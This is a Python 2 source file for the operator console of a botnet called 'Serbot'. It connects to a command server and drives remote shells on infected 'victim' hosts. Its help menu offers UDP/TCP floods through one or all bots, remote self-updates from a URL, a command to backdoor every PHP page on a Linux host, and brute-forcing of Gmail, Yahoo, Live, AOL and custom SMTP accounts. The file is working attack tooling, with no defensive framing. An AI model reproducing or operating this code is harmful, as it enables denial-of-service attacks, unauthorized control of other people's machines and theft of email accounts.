#!/usr/bin/env python2

import subprocess, os, sys, time, threading
from clint.textui import colored
from socket import *

intro = """
 ____ ____ ____ ____ ____ ____ 
||S |||e |||r |||b |||o |||t ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|

Coded by: dotcppfile
Twitter: https://twitter.com/dotcppfile
Blog: http://dotcppfile.worpdress.com
"""

commands = """

Primary:
--------
accept                  | Accept connections
list                    | List connections
clear                   | Clear the console
quit                    | Close all connections and quit
credits                 | Show Credits
help                    | Show this message

Client Interaction:
-------------------
interact <id>           | Interact with client
stop                    | Stop interacting with client
udpflood <ip>:<port>    | UDP flood threw client
tcpflood <ip>:<port>    | TCP flood threw client
linuxbackdoor           | Infects all php pages with malicious code that will execute the Serbot Client if it's dead.

Wide Commands:
--------------
udpfloodall <ip>:<port> | UDP flood threw All clients
tcpfloodall <ip>:<port> | TCP flood threw All clients
selfupdateall <link>    | Update all Clients
	Example: selfupdateall http://whatever.com/newscript.py

Bruteforce:
-----------
gmailbruteforce <email>:<keys>:<min>:<max>
yahoobruteforce <email>:<keys>:<min>:<max>
livebruteforce <email>:<keys>:<min>:<max>
aolbruteforce <email>:<keys>:<min>:<max>
	Example: gmailbruteforce someone@gmail.com:0123456789:6:8
custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
	Example: custombruteforce smtp.whatever.com:587:something@whatever.com:abcdefghi:4:6

\n"""

if (len(sys.argv) == 4):
	host = sys.argv[1]
	port = int(sys.argv[2])
	password = sys.argv[3]
else:
	sys.exit("Usage: client.py <server ip> <server bridge port> <password>")

def main():
	print intro
	try:
		s=socket(AF_INET, SOCK_STREAM)
		s.connect((host,port))
	except:
		sys.exit("[ERROR] Can't connect to server")

	s.send(password)

	while 1:
		command = raw_input("> ")
		try:
			if (command == "accept"):
				s.send("accept")
				print s.recv(20480)
			elif (command == "list"):
				s.send("list")
				print s.recv(20480)
			elif ("interact " in command):
				s.send(command)
				temporary = s.recv(20480)
				if ("ERROR" not in temporary):
					victimpath = s.recv(20480)
					if ("ERROR" not in victimpath):
						while 1:
							data = raw_input(victimpath)
							if (data == "stop"):
								s.send("stop")
								print "\n"
								break
							elif ("cd " in data):
								s.send(data)
								victimpath = s.recv(20480)
								if ("ERROR" in victimpath):
									print victimpath
									break
							elif (data == ""):
								print "[CONTROLLER] Nothing to be sent...\n"
							else:
								s.send(data)
								print s.recv(20480)
					else:
						print victimpath
						break
				else:
					print temporary
			elif (("udpfloodall " in command) or ("tcpfloodall " in command)):
				s.send(command)
			elif(command == "clear"):
				if sys.platform == 'win32':
					os.system("cls")
				else:
					os.system("clear")
			elif(command == "quit"):
				s.send("quit")
				s.close()
				break
			elif(command == "help"):
				print commands
			elif(command == "credits"):
				print "--------\nCredits:\n--------\nCoded by: dotcppfile\nTwitter: https://twitter.com/dotcppfile\nBlog: http://dotcppfile.worpdress.com\n"
			else:
				print "[CONTROLLER] Invalid Command\n"
		except KeyboardInterrupt:
			try:
				s.send("quit")
				s.close()
				print ""
				break
			except:
				pass
		except:
			print "[CONTROLLER] Connection Closed"
			s.close()
			break
		
main()
